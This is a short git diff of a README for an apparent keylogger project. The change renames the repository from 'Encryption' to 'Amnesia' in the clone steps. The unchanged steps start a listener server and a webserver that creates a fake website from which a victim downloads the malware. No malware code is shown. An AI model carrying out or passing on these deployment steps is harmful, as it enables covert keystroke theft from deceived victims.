@@ -23,8 +23,8 @@ There is also one additional file called `webserver.py`. Run this file if you wa
   - pynput.keyboard
 
 ### Running the keylogger
-1. Clone the repository with git `git clone https://github.com/o7raven/Encryption`
-2. Then enter the directory `cd Encryption`
+1. Clone the repository with git `git clone https://github.com/o7raven/Amnesia`
+2. Then enter the directory `cd Amnesia`
 3. Download pip requirements `pip install -r requirements`
 4. Start the server by running `python server.py`. This will start a listener
 5. Start the webserver by running `python webserver.py`. This will create a fake website from which your victim can download the malware
